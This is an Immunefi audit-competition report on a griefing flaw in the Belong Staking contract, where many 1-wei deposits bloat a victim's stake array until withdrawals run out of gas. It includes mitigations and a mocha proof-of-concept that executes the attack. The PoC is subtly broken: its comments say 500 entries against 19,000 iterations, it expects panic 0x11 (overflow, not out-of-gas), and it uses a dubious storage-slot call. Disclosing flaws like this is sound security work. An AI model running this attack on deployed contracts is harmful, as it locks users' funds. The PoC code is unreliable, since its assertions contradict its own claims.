# 57015 sc medium unbounded array loop

Submitted on Oct 22nd 2025 at 17:03:38 UTC by @pawps for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)

* Report ID: #57015
* Report Type: Smart Contract
* Report severity: Medium
* Target: <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Vulnerability Details

The unbounded `Stake[]` array in the `Staking` contract causes a grief vector that allows users or an attacker to trigger an out-of-gas (OOG) revert when a user tries to withdraw their funds. Withdraw logic loops over the entire array (`_consumeUnlockedSharesOrRevert` for regular withdraw and `_removeAnySharesFor` for emergency withdraw), which can be made arbitrarily large by repeatedly depositing tiny stakes.

Example vulnerable loops:

```solidity
function _consumeUnlockedSharesOrRevert(address staker, uint256 need) internal {
    Stake[] storage userStakes = stakes[staker];
    uint256 _min = minStakePeriod;
    uint256 nowTs = block.timestamp;
    uint256 remaining = need;

    for (uint256 i; i < userStakes.length && remaining > 0;) {
        Stake memory s = userStakes[i];
        ...
    }
}
```

```solidity
function _removeAnySharesFor(address staker, uint256 shares) internal {
    Stake[] storage userStakes = stakes[staker];
    uint256 remaining = shares;

    for (uint256 i; i < userStakes.length && remaining > 0;) {
        uint256 stakeShares = userStakes[i].shares;
        ...
    }
}
```

Although the functions permit specifying an amount to withdraw (which can reduce iterations), an attacker can repeatedly deposit 1 wei (or other tiny amounts) under a victim's address. Because the data structure is FIFO and each deposit creates an entry, victims will either encounter OOG reverts on normal withdraws or be forced to withdraw in many very small recursive transactions to drain their funds.

### Impact Details

* Funds can become effectively locked in the contract for victims.
* Out-of-gas reverts on withdraw attempts.
* Grief attack where attacker need not profit but can lock other users' funds.

## Mitigation

* Enforce a whitelist for permitted depositors (per-user depositor whitelist).
* Enforce a minimum stake amount so spam deposits are impractical.
* Replace looping over the whole array with a start and end index (cursor-based processing) to allow incremental processing without iterating the entire array in a single transaction.

{% hint style="warning" %}
Do not add behavior that relies solely on gas costs or optimistic assumptions; prefer structural changes (minimum stake, indexed/bounded consumption).
{% endhint %}

## Proof of Concept

<details>

<summary>OOG Grief Attack PoC (truffle/mocha style)</summary>

```solidity
describe('OOG Grief Attack PoC', () => {
  it('attacker locks a victim_s funds via OOG', async () => {
    const { staking, long, admin, attacker, victim } = await loadFixture(fixture);

    // --- Setup ---
    const victimDepositAmount = ethers.utils.parseEther('1000');
    const griefingDepositAmount = 1; // 1 wei
    const griefingIterations = 19000; // Number of times to loop.

    // Fund attacker with enough for all the tiny deposits
    await long.connect(admin).transfer(attacker.address, griefingDepositAmount * griefingIterations);
    // Fund victim for their large deposit
    await long.connect(admin).transfer(victim.address, victimDepositAmount);

    // Attacker must approve the staking contract
    await long.connect(attacker).approve(staking.address, ethers.constants.MaxUint256);


    console.log(`Attacker: Starting ${griefingIterations} griefing deposits...`);
    for (let i = 0; i < griefingIterations; i++) {
      await staking.connect(attacker).deposit(griefingDepositAmount, victim.address);
    }
    console.log('Attacker: Griefing complete.');

    // At this point, victim.stakes array has 500 entries
    const victimStakeCount = (await staking.provider.getStorageAt(staking.address, await staking.stakes.getStorageSlot(victim.address))).slice(-64);
    expect(parseInt(victimStakeCount, 16)).to.eq(griefingIterations);


    await long.connect(victim).approve(staking.address, victimDepositAmount);
    await staking.connect(victim).deposit(victimDepositAmount, victim.address);
    console.log('Victim: Made large deposit.');

    // Victim's stake array now has 501 entries
    const newVictimStakeCount = (await staking.provider.getStorageAt(staking.address, await staking.stakes.getStorageSlot(victim.address))).slice(-64);
    expect(parseInt(newVictimStakeCount, 16)).to.eq(griefingIterations + 1);

    const minStakePeriod = await staking.minStakePeriod();
    await time.increase(minStakePeriod.add(1));
    console.log('Time advanced. Stakes unlocked.');

    // Victim tries to withdraw their unlocked 1-wei stakes
    console.log('Victim: Attempting to withdraw unlocked assets...');

    // This transaction will fail by running out of gas.
    await expect(
      staking.connect(victim).withdraw(victimDepositAmount, victim.address, victim.address)
    ).to.be.revertedWithPanic(0x11);

    console.log('Victim: Withdrawal FAILED due to Out-of-Gas.');
  });
});
```

</details>

## References

Add any relevant links to documentation or code.
